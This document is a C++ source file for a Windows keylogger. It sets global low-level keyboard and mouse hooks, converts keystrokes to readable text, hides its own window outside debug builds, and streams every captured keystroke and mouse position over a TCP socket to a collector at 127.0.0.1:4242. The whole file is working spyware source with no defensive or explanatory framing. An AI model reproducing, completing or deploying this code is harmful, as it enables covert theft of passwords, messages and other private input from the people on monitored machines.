#include "Working.h"

HHOOK	_kbdhook;
HHOOK	_mshook;
bool	_running;

__declspec(dllexport) LRESULT CALLBACK handlemouse(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && wp == WM_MOUSEMOVE)
	{
		MSLLHOOKSTRUCT *s_mouse = reinterpret_cast<MSLLHOOKSTRUCT*>(lp);
		/*std::string path = "LOG"/*std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << "x = " << s_mouse->pt.x << " y = " << s_mouse->pt.y << std::endl;
		outfile.close();*/
		Working::fillData(s_mouse->pt.x, s_mouse->pt.y);
	}

	return CallNextHookEx(_mshook, code, wp, lp);
}

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;


		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		if (!printable) {

			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("[" + str + "]");
			}
		}

		if (printable) {
			if (shift == capslock) {
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else {
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

/*#ifdef DEBUG
		std::cout << str;
#endif
		/*std::string path = "LOG"/*std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();*/
		Working::fillData(str);
	}

	return CallNextHookEx(_kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		_running = false;
		break;
	default:
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

Working::Working(HINSTANCE thisinstance, HOOKPROC _handlemouse, HOOKPROC _handlekeys, WNDPROC _windowprocedure) :
	m_handlekeys(_handlekeys == NULL ? handlekeys : _handlekeys), m_handlemouse(_handlemouse == NULL ? handlemouse : _handlemouse)
{
	fgwindow = GetForegroundWindow();

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = _windowprocedure == NULL ? windowprocedure : _windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassEx(&windowclass)))
		throw;

	hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	if (!(hwnd))
		throw;

#ifdef DEBUG
	ShowWindow(hwnd, SW_SHOW);
#else
	ShowWindow(hwnd, SW_HIDE);
#endif
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow);

	modulehandle = GetModuleHandle(NULL);
	_kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, m_handlekeys, modulehandle, NULL);
	_mshook = SetWindowsHookEx(WH_MOUSE_LL, m_handlemouse, modulehandle, NULL);

	_running = true;
	this->client = NULL;
	GetWindowsDirectory((LPSTR)windir, MAX_PATH);
}

int Working::Work()
{
	int		is_connect = -1;
	Packet	*packet;

	while (_running) {
		if (is_connect == -1)
		{
			try
			{
				client = (WinSocket*)ISocket::getClient("127.0.0.1", 4242, "TCP");
				is_connect = client->start();
			}
			catch (BBException &e)
			{
				std::cerr << e.what() << std::endl;
			}
			if (is_connect == -1 && client != NULL)
			{
				delete client;
				client = NULL;
			}
		}
		if (!GetMessage(&msg, NULL, 0, 0))
			_running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		if (client != NULL && !this->Data("").empty())
		{
			packet = Packet::pack(this->Data("")[0]);
			this->Data("").erase(this->Data("").begin(), this->Data("").begin() + 1);
			client->writePacket(packet);
			delete packet;
		}
	}
	return 0;
}

void Working::fillData(std::string str)
{
	Working::Data(str);
}

void Working::fillData(long x, long y)
{
	std::stringstream ss;

	ss << "x = ";
	ss << x;
	ss << " y = ";
	ss << y;
	Working::Data(ss.str());
}

std::vector<std::string>& Working::Data(std::string str)
{
	static std::vector<std::string>	data;

	if (!str.empty())
	{
		data.push_back(str);
	}
	return data;
}

void Working::printData() const
{
	for each  (std::string str in Working::Data(""))
	{
		std::cout << str << std::endl;
	}
}

Working::~Working()
{
}
